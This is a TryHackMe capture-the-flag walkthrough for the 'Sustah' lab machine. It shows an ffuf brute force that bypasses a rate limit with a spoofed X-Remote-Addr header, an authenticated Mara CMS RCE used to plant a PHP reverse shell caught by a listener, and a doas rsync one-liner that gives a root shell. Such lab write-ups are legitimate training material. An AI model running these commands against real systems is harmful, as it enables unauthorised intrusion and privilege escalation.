# **Sustah - TryHackMe**

*Target Ip. Address: 10.49.140.184*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.49.140.184
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 13:11 +0545
Nmap scan report for 10.49.140.184
Host is up (0.034s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
|   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
|_  256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Susta
8085/tcp open  http    Gunicorn 20.0.4
|_http-title: Spinner
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.78 seconds
```

So, we have 3 ports. The website on port 80 has nothing interesting, let's move on to port 8085.

It has a roulette game, and we have to guess a number.

Unfortunately, we have a rate limit on that.

Searching, for some rate bypass headers, *"X-Remote-Addr" : "127.0.0.1"*, this works.

Now, we can use ffuf to brute force the number with the header to bypass rate limiting.

```bash
kali@kali:ffuf -u http://10.49.140.184:8085/ \
     -X POST \
     -d "number=FUZZ" \
     -H "X-Remote-Addr: 127.0.0.1" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -w <(seq 10000 99999) \
     -fr "Oh no! How unlucky" \
     -t 50

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.49.140.184:8085/
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Header           : X-Remote-Addr: 127.0.0.1
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : number=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Oh no! How unlucky
________________________________________________

-----                   [Status: 200, Size: 975, Words: 149, Lines: 39, Duration: 34ms]
:: Progress: [90000/90000] :: Job [1/1] :: 194 req/sec :: Duration: [0:03:48] :: Errors: 0 ::
```

So, we have our lucky number. Let's see what hint it gives us.

<img width="742" height="728" alt="image" src="https://github.com/user-attachments/assets/ca1318c7-cc62-4e54-a08c-21d123de3098" />

It gave us a path. It works on website on port 80.

So, the path leads us to Mara CMS. We don't know the exact version, but we know from hint it is vulnerable.

```bash
kali@kali:searchsploit mara cms                                                                                                                 
----------------------------------------------------------------------------------- -----------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- -----------------------
Elxis CMS 2009 - 'administrator/index.php' URI Cross-Site Scripting                | php/webapps/36407.txt
Elxis CMS 2009 - 'index.php?task' Cross-Site Scripting                             | php/webapps/36406.txt
Mara CMS  7.5 - Reflective Cross-Site Scripting                                    | php/webapps/48777.txt
Mara CMS 7.5 - Remote Code Execution (Authenticated)                               | php/webapps/48780.txt
----------------------------------------------------------------------------------- -----------------------
Shellcodes: No Results
```

So, it has RCE but authenticated. Let's read the exploit if it helps.

```bash
kali@kali:searchsploit -m php/webapps/48780.txt
  Exploit: Mara CMS 7.5 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/48780
     Path: /usr/share/exploitdb/exploits/php/webapps/48780.txt
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied to: /home/kali/48780.txt
```

It has a valid set of default credentials, let's see if it works.

For login page: *http://10.49.140.184/Yo-----th/index.php?login=*

So, default credentials work. 

So, following the exploit I uploaded the php reverse shell and it is found at *http://10.49.140.184/Yo-----th/img/rev.php*.

Start the listener.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Refresh the page.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from ubuntu-xenial~10.49.140.184-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /home/kali/.penelope/sessions/ubuntu-xenial~10.49.140.184-Linux-x86_64/2026_02_16-13_45_00-794.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@ubuntu-xenial:/$
```

We got a reverse shell as user www-data.

```bash
www-data@ubuntu-xenial:/home/kiran$ cat user.txt
cat: user.txt: Permission denied
```

We cannot read the flag, let's try to escalate.

```bash
www-data@ubuntu-xenial:/var/backups$ ls -la
total 636
drwxr-xr-x  2 root root     4096 Dec  9  2020 .
drwxr-xr-x 14 root root     4096 Dec  6  2020 ..
-r--r--r--  1 root root     1722 Dec  6  2020 .bak.passwd
-rw-r--r--  1 root root    51200 Dec  6  2020 alternatives.tar.0
-rw-r--r--  1 root root     6308 Dec  9  2020 apt.extended_states.0
-rw-r--r--  1 root root      715 Dec  6  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root      509 Nov 12  2020 dpkg.diversions.0
-rw-r--r--  1 root root      207 Dec  6  2020 dpkg.statoverride.0
-rw-r--r--  1 root root   547201 Dec  6  2020 dpkg.status.0
-rw-------  1 root root      849 Dec  6  2020 group.bak
-rw-------  1 root shadow    714 Dec  6  2020 gshadow.bak
-rw-------  1 root root     1695 Dec  6  2020 passwd.bak
-rw-------  1 root shadow   1031 Dec  6  2020 shadow.bak
```

This is different from default. we have .bak.passwd. And we have read permissions too.

```bash
www-data@ubuntu-xenial:/var/backups$ cat .bak.passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
kiran:x:1002:1002:trythispasswordforuserkiran:/home/kiran:
```

We got the password for user kiran.

```bash
www-data@ubuntu-xenial:/$ su kiran
Password: 
kiran@ubuntu-xenial:/$ id
uid=1002(kiran) gid=1002(kiran) groups=1002(kiran)
```

Now, we can read the user flag.

```bash
kiran@ubuntu-xenial:~$ cat user.txt
6b.....c8
```

No sudo, we cannot list SUID, no cronjobs. Let's see if we can get anything from linpeas.

```bash
╔══════════╣ Doas Configuration
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#doas
Doas binary found at: /usr/local/bin/doas
Doas binary has SUID bit set!
-rwsr-x--x 1 root root 38616 Dec  6  2020 /usr/local/bin/doas
-e
Checking doas.conf files:
Found: /usr/local/bin/../etc/doas.conf
 permit nopass kiran as root cmd rsync
Found: /usr/local/etc/doas.conf
 permit nopass kiran as root cmd rsync
-e
Testing doas:
```

That's some interesting find. We can use rsync as root with doas.

We can find exploit in "*https://gtfobins.org/gtfobins/rsync/*

```bash
kiran@ubuntu-xenial:~$ doas -u root rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
# id
uid=0(root) gid=0(root) groups=0(root)
```

Since, we are root. Let's read final flag and end this challenge.

```bash
# cat root.txt
af.....95
```
